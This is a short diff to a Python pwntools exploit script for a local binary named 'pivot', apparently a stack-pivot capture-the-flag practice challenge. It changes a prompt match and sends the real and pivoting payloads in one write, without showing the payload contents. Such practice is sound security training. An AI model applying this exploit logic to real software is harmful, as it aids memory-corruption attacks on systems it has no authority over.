@@ -94,7 +94,7 @@ else:
     p = pwn.process("./pivot")
 
     ### Extract the pivot destination from the output.
-    preface = p.recvuntil(b">")
+    preface = p.recvuntil(b"> ")
     print(preface)
     temp = preface[preface.index(b"0x") + 2: ]
     pivot_dest_str = temp[: temp.index(b"\n")]
@@ -114,12 +114,6 @@ if static:
         f.write(pivot_exploit.payload)
 
 else:
-    ### Send the real payload to the pivot destination.
-    p.send(real_exploit.payload)
-
-    print(p.recvuntil(b">"))
-
-    ### Send the pivoting payload.
-    p.send(pivot_exploit.payload)
+    p.send(real_exploit.payload + pivot_exploit.payload)
 
     print(p.recvall())
